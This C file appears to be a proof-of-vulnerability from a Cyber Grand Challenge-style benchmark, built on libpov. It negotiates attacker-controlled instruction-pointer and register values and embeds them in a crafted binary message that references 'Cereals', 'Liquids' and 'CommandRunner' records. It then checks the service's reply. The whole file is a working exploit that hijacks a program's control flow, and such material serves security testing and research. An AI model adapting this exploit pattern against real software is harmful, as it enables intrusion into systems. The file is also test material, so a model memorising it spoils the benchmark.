#include <libpov.h>
int main(void) {
   type1_vals t1vals = { 0 };
   uint32_t mask_eip, mask_reg;

   mask_eip = 0x0EFEFEFE;
   mask_reg = 0x0EFEFEFE;
   type1_negotiate(mask_eip, mask_reg, 2, &t1vals);

   t1vals.ipval |= 0xF1010101;
   t1vals.regval |= 0xF1010101;
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x00\xaa\xdd\x11\x72\x00\x01\x00\x00\x00\x43\x65\x72\x65\x61\x6c"
         "\x73\x00\x00\x00\x00\x00\x00\x00\x00\x4c\x69\x71\x75\x69\x64\x73"
         "\x04\x00\x00\x00\x01\x00\x00\x00\x43\x65\x72\x65\x61\x6c\x73\x02"
         "\x00\x00\x00\x01\x00\x00\x00\x43\x65\x72\x65\x61\x6c\x73\x04\x00"
         "\x00\x00\x00\x00\x00\x00\x4c\x69\x71\x75\x69\x64\x73\x03\x00\x00"
         "\x00\x05\x00\x00\x00\x43\x6f\x6d\x6d\x61\x6e\x64\x52\x75\x6e\x6e"
         "\x65\x72\x04\x00";
      static unsigned int write_00000_00000_len = 100;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);

   do {
      //*** writing data
      // static unsigned char write_00000_00000[] = 
      //    "\x41\x41\x44\x44"; // ipval

      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, (unsigned char *)&t1vals.ipval, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);

   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x20\x80\x00\x00\x00\x20";
      static unsigned int write_00000_00000_len = 6;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);

   do {
      //*** writing data
      // static unsigned char write_00000_00000[] = 
      //    "\x00\x04\x00\x00"; // regval (edx)

      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, (unsigned char *)&t1vals.regval, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);

   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x20\x00\x10\x00\x00\x00";
      static unsigned int write_00000_00000_len = 6;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);

   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 20;
      read_00000 = (unsigned char*)malloc(read_00000_len);
      int read_00000_res = length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x92\x10\x00\x00\x11\xd1\xe0\xa4\xec\xdf\x01\xbb\xba\xfd\xff\x03"
         "\x3a\xcc\x00\xe8";
      read_00000_ptr += data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 20);
      free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** length read
      read_00001_len = 4;
      read_00001 = (unsigned char*)malloc(read_00001_len);
      int read_00001_res = length_read(0, read_00001, read_00001_len);
      if (read_00001_res) {} //silence unused variable warning
      free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);

}
